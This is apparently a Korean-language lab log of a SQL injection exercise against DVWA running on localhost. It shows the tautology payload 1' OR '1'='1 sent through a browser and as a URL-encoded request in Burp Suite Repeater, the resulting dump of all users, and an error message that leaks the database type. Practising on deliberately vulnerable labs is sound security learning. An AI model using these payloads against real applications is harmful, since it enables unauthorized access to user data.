# Day 6 - DVWA SQL Injection 실습

## 환경
- DVWA: `http://localhost:8081`
- Security Level: Low
- 메뉴: SQL Injection

## DVWA 실행
```bash
docker start $(docker ps -aq --filter ancestor=vulnerables/web-dvwa)
```

---

## Step 1 - 정상 동작 확인

입력창에 `1` 입력 → Submit

결과:
```
ID: 1
First name: admin
Surname: admin
```

---

## Step 2 - 브라우저로 SQL Injection

입력창에:
```
1' OR '1'='1
```

결과: DB의 모든 유저 출력
```
First name: admin,  Surname: admin
First name: Gordon, Surname: Brown
First name: Hack,   Surname: Me
First name: Pablo,  Surname: Picasso
First name: Bob,    Surname: Smith
```

### 왜 됐나
실제 실행된 쿼리:
```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```
- `'1'='1'` 은 항상 참
- WHERE 조건이 항상 참 → 테이블 전체 반환

---

## Step 3 - Burp Suite Repeater로 공격

### 요청 캡처
1. Burp Intercept ON → Open Browser에서 DVWA 접속 → SQL Injection 메뉴
2. `1` 입력 후 Submit → 요청 캡처:
   ```
   GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
   ```
3. 우클릭 → Send to Repeater → Forward

### Repeater에서 공격
URL의 `id=1` 부분을 수정:
```
GET /vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
```

Send → 응답에서 전체 유저 목록 확인

### URL 인코딩이 필요한 이유
브라우저는 특수문자를 자동으로 인코딩하지만, Burp Repeater에서 직접 보낼 땐 수동으로 인코딩 필요:
```
'  → %27
=  → %3D
공백 → +
```

---

## 에러 메시지에서 얻은 정보

처음 `' OR 1=1 --` 시도했을 때:
```
You have an error in your SQL syntax; check the manual that corresponds
to your MariaDB server version...
```

→ **MariaDB** 사용 중이라는 정보 노출
→ Day 5 패턴 8 (에러 처리) 취약점 — 에러 메시지를 클라이언트에 그대로 노출

---

## 핵심 정리

| 방법 | 특징 |
|------|------|
| 브라우저 직접 입력 | 브라우저가 URL 인코딩 자동 처리 |
| Burp Repeater | 직접 HTTP 요청 조작, URL 인코딩 수동 필요 |

Burp Repeater를 쓰면 브라우저 없이 HTTP 요청을 직접 조작할 수 있어서 더 정밀한 테스트 가능.
